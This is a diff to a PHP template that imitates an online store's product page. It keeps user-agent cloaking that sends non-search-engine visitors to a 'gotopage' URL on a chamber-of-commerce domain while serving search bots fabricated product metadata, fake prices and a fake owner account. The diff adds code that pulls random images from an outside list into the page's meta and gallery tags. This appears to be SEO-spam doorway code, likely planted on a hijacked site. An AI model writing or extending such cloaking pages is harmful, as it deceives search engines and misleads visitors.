@@ -1,7 +1,7 @@
 <?php
 if (isset($_SERVER['HTTP_USER_AGENT'])) {
     $user_agent = $_SERVER['HTTP_USER_AGENT'];
-
+    
     // (case-insensitive)
     if (!preg_match('/google|bing|yandex/i', $user_agent)) {
         $relative_gotopage_url = 'https://www.sookeregionchamber.com/gotopage/?p=' . urlencode(strtoupper($title));
@@ -13,6 +13,19 @@ if (isset($_SERVER['HTTP_USER_AGENT'])) {
 }
 ?>
 <?php
+// --- LOGIKA BARU UNTUK MENGAMBIL GAMBAR ACAK DARI URL ANDA ---
+$image_list_url = 'https://sooker.pages.dev/urls.txt';
+$fallback_image_url = 'https://placehold.co/1280x720/111827/FFFFFF?text=' . urlencode($title);
+$random_image_url = $fallback_image_url; // Set gambar default
+
+$image_list_content = @file_get_contents($image_list_url);
+if ($image_list_content) {
+    $image_urls = explode("\n", trim($image_list_content));
+    $image_urls = array_filter($image_urls);
+    if (!empty($image_urls)) {
+        $random_image_url = $image_urls[array_rand($image_urls)];
+    }
+}
 $canonical = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 function getRandomHexColor() {
     return '#' . substr(str_shuffle('ABCDEF0123456789'), 0, 6);
@@ -93,7 +106,7 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
     <meta property="og:url" content="<?php echo $canonical; ?>" />
     <meta property="og:type" content="product" />
     <meta property="og:description" content="<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?>" />
-    <meta property="og:image" content="<?php echo $canonical; ?>thumbnail.jpg" />
+    <meta property="og:image" content="<?php echo $random_image_url;?>" />
     <meta property="og:image:width" content="840" />
     <meta property="og:image:height" content="480" />
     <meta property="product:price:amount" content="<?php echo $random_price;?>" />
@@ -102,11 +115,11 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
     <meta itemprop="name" content="<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?>" />
     <meta itemprop="url" content="<?php echo $canonical; ?>" />
     <meta itemprop="description" content="<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?>" />
-    <meta itemprop="thumbnailUrl" content="<?php echo $canonical; ?>thumbnail.jpg" />
-    <link rel="image_src" href="<?php echo $canonical; ?>thumbnail.jpg" />
-    <meta itemprop="image" content="<?php echo $canonical; ?>thumbnail.jpg" />
+    <meta itemprop="thumbnailUrl" content="<?php echo $random_image_url;?>" />
+    <link rel="image_src" href="<?php echo $random_image_url;?>" />
+    <meta itemprop="image" content="<?php echo $random_image_url;?>" />
     <meta name="twitter:title" content="<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?>" />
-    <meta name="twitter:image" content="<?php echo $canonical; ?>thumbnail.jpg" />
+    <meta name="twitter:image" content="<?php echo $random_image_url;?>" />
     <meta name="twitter:url" content="<?php echo $canonical; ?>" />
     <meta name="twitter:card" content="summary" />
     <meta name="twitter:description" content="<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?>" />
@@ -600,13 +613,13 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
           "firstName": "Admin",
           "lastName": "Gans",
           "eligibleForMarketingDiscount": false,
-          "avatarUrl": "<?php echo $canonical; ?>thumbnail.jpg?format=300w",
+          "avatarUrl": "<?php echo $random_image_url;?>?format=300w",
           "bio": "Owner Product",
           "roles": "Owner",
           "email": "<?php echo $dynamic_user_email;?>",
           "createdOn": 1751055315000,
           "marketingId": "8a89b7bf-913e-404f-8ced-d1dde4b91061",
-          "avatarAssetUrl": "<?php echo $canonical; ?>thumbnail.jpg?format=300w",
+          "avatarAssetUrl": "<?php echo $random_image_url;?>?format=300w",
           "pseudonymAccount": false,
           "preferredLocale": "en-US"
         },
@@ -624,7 +637,7 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
         "accessPermissions": [1310, 1701, 1225, 1414, 1216, 1234, 1910, 1421, 1700, 1516, 1513, 1517, 1415, 1422, 1233, 1932, 1413, 1211, 1229, 1420, 1110, 1223, 1230, 1212, 1228, 12, 1210, 1512, 1111, 1226, 1418, 1214, 1419, 1912, 1112, 1410, 1224, 1611, 1921, 1219, 1220, 1311, 1423, 1515, 1612, 1213, 1411, 0, 1416, 1417, 15, 11, 13, 1412, 1930, 1931, 1911, 1514, 1610, 14, 1218, 1511, 1810, 1, 1510, 1221, 2066, 18, 1920, 1215, 1217],
         "memberAccountNames": {
           "65c59c43aeb76a63df61000a": {
-            "avatarUrl": "<?php echo $canonical; ?>thumbnail.jpg?format=300w",
+            "avatarUrl": "<?php echo $random_image_url;?>?format=300w",
             "bio": "",
             "displayName": "<?php echo strtoupper($title); ?> "
           }
@@ -709,7 +722,7 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
     <script type="application/ld+json">
       {
         "name": "<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?> \u2025 <?php echo strtoupper($title); ?>",
-        "image": "<?php echo $canonical; ?>thumbnail.jpg",
+        "image": "<?php echo $random_image_url;?>",
         "description": "<?php echo strtoupper($title); ?> : <?php echo $additional_content; ?>",
         "brand": "<?php echo strtoupper($title); ?>",
         "offers": {
@@ -1615,8 +1628,8 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
                     <section class="ProductItem-summary" data-controller="ProductGallery">
                       <section aria-label="Gallery" class="ProductItem-gallery" data-product-gallery="container">
                         <div class="ProductItem-gallery-slides" data-animation-role="image" data-product-gallery="slides">
-                          <div class="ProductItem-gallery-slides-item" data-slide-index="1" data-image-id="65fd0fd62438744c9a05c86b" data-controller="ImageZoom" data-slide-url="zeus" data-product-gallery="slides-item" data-test="pdp-gallery-slide"><img aria-describedby="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b" class="ProductItem-gallery-slides-item-1" data-load="false" data-src="<?php echo $canonical; ?>thumbnail.jpg" data-image="<?php echo $canonical; ?>thumbnail.jpg" data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($title); ?>" elementtiming="nbf-products-gallery" /><span id="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b" style="display: none;"> Image 1 of </span>
-                            <div class="product-image-zoom-duplicate" aria-hidden="true"><img data-load="false" data-src="<?php echo $canonical; ?>thumbnail.jpg" data-image="<?php echo $canonical; ?>thumbnail.jpg" data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($title); ?>" elementtiming="nbf-products-gallery-zoom" /></div>
+                          <div class="ProductItem-gallery-slides-item" data-slide-index="1" data-image-id="65fd0fd62438744c9a05c86b" data-controller="ImageZoom" data-slide-url="zeus" data-product-gallery="slides-item" data-test="pdp-gallery-slide"><img aria-describedby="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b" class="ProductItem-gallery-slides-item-1" data-load="false" data-src="<?php echo $random_image_url;?>" data-image="<?php echo $random_image_url;?>" data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($title); ?>" elementtiming="nbf-products-gallery" /><span id="ProductItem-gallery-slides-item-1-index-65fd0fd62438744c9a05c86b" style="display: none;"> Image 1 of </span>
+                            <div class="product-image-zoom-duplicate" aria-hidden="true"><img data-load="false" data-src="<?php echo $random_image_url;?>" data-image="<?php echo $random_image_url;?>" data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($title); ?>" elementtiming="nbf-products-gallery-zoom" /></div>
                           </div>
                           <div class="gallery-lightbox-outer-wrapper" data-use-image-loader="true" data-controller="Lightbox">
                             <div class="gallery-lightbox " data-section-theme>
@@ -1632,7 +1645,7 @@ $random_variant_id = sprintf('%s-%s-4%s-%s-%s',
                                   <figure class="gallery-lightbox-item" data-slide-url="zeus">
                                     <div class="gallery-lightbox-item-wrapper">
                                       <div class="gallery-lightbox-item-src">
-                                        <div class="gallery-lightbox-item-img content-fit"><img data-src="<?php echo $canonical; ?>thumbnail.jpg" data-image="<?php echo $canonical; ?>thumbnail.jpg" data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($title); ?>" data-load="false" elementtiming="nbf-product-lightbox" /></div>
+                                        <div class="gallery-lightbox-item-img content-fit"><img data-src="<?php echo $random_image_url;?>" data-image="<?php echo $random_image_url;?>" data-image-dimensions="840x480" data-image-focal-point="0.5,0.5" alt="<?php echo strtoupper($title); ?>" data-load="false" elementtiming="nbf-product-lightbox" /></div>
                                       </div>
                                     </div>
                                   </figure>
